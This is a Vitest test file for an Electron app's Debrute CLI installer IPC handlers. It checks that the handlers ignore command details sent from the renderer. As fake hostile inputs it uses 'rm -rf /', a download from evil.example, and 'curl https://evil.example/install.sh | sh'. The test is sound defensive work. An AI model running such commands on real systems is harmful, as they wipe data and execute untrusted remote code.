import { describe, expect, it, vi } from 'vitest';
import { registerDebruteCliShellIpc } from '../apps/desktop/src/electron/debruteCliShell';

describe('Desktop Debrute CLI shell IPC', () => {
  it('registers fixed actions that ignore renderer-provided command details', async () => {
    const handlers = new Map<string, (event: unknown, input?: unknown) => unknown>();
    const installedStatus = {
      kind: 'installed' as const,
      desktopVersion: '0.2.0',
      cliVersion: '0.2.0',
      managedPath: '/debrute',
      resolvedPath: '/debrute',
      onPath: true,
      skills: { kind: 'in_sync' as const, debruteVersion: '0.2.0' }
    };
    const installer = {
      getStatus: vi.fn(async () => ({ kind: 'not_installed' as const, desktopVersion: '0.2.0', manualCommand: 'curl ...' })),
      install: vi.fn(async () => ({ ok: true, status: installedStatus })),
      update: vi.fn(async () => ({ ok: true, status: installedStatus })),
      repairPath: vi.fn(async () => ({ ok: true, status: installedStatus })),
      syncSkills: vi.fn(async () => ({ ok: true, status: { kind: 'in_sync' as const, debruteVersion: '0.2.0' } })),
      getManualInstallCommand: vi.fn(async () => ({ platform: 'macos' as const, command: 'curl ... && debrute skills sync' }))
    };

    registerDebruteCliShellIpc({
      ipcMain: { handle: (channel: string, handler: (event: unknown, input?: unknown) => unknown) => { handlers.set(channel, handler); } },
      installer
    });

    await handlers.get('debrute-shell:installDebruteCli')?.({}, { url: 'https://evil.example/debrute.zip', command: 'rm -rf /' });
    await handlers.get('debrute-shell:restoreDebruteCliSkills')?.({}, { force: false });
    await handlers.get('debrute-shell:getDebruteCliManualInstallCommand')?.({}, { command: 'curl https://evil.example/install.sh | sh' });

    expect(installer.install).toHaveBeenCalledWith();
    expect(installer.syncSkills).toHaveBeenCalledWith(true);
    expect(installer.getManualInstallCommand).toHaveBeenCalledWith();
  });
});
